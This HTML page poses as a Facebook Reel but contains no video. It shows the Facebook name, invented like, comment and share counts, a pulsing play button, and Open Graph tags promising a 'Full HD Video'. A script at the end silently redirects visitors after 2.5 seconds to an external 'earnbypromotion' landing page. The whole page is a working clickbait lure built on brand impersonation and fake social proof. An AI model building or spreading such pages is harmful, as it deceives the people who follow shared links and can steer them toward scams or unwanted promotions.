<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Reel</title>
    <!-- Open Graph Meta Tags for Facebook Preview -->
    <meta property="og:title" content="Watch Full HD Video">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-09-22-94691a15-7f92-475a-a619-7dd3123422d4.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body, html {
            height: 100%;
            width: 100%;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .reel-container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .top-bar {
            position: absolute;
            top: 16px;
            left: 16px;
            display: flex;
            align-items: center;
            z-index: 10;
        }

        .fb-logo {
            font-size: 24px;
            font-weight: bold;
            color: #1877f2;
        }

        .right-sidebar {
            position: absolute;
            right: 12px;
            bottom: 80px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            z-index: 10;
        }

        .icon-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
        }

        .icon-btn svg {
            width: 28px;
            height: 28px;
            fill: #fff;
            margin-bottom: 4px;
        }

        .bottom-info {
            position: absolute;
            bottom: 20px;
            left: 16px;
            right: 80px;
            z-index: 10;
        }

        .user-profile {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }

        .avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: #1877f2;
        }

        .username {
            font-weight: 600;
            font-size: 14px;
        }

        .caption {
            font-size: 13px;
            color: #e4e6eb;
        }

        .loader-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
        }

        .play-icon {
            width: 65px;
            height: 65px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 2px solid rgba(255, 255, 255, 0.8);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.08); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="reel-container">
        <!-- Reel Background Image -->
        <img src="https://postimg.cc/HjQZRNgb" alt="Facebook Reel Video" class="video-placeholder">

        <!-- Top Facebook Bar -->
        <div class="top-bar">
            <span class="fb-logo">facebook</span>
        </div>

        <!-- Animated Center Play Button -->
        <div class="loader-overlay">
            <div class="play-icon">
                <svg viewBox="0 0 24 24" width="32" height="32" fill="#ffffff">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
        </div>

        <!-- Right Side Icons -->
        <div class="right-sidebar">
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                <span>312.4K</span>
            </div>
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z"/></svg>
                <span>4.8K</span>
            </div>
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
                <span>18.2K</span>
            </div>
        </div>

        <!-- Bottom User Details -->
        <div class="bottom-info">
            <div class="user-profile">
                <div class="avatar"></div>
                <span class="username">Trending Reels Media</span>
            </div>
            <p class="caption">Loading full HD video stream player...</p>
        </div>
    </div>

    <!-- Redirection Script -->
    <script>
        const LANDING_PAGE_URL = "https://earnbypromotion.github.io/index/landing.html";

        setTimeout(function() {
            window.location.replace(LANDING_PAGE_URL);
        }, 2500);
    </script>
</body>
</html>
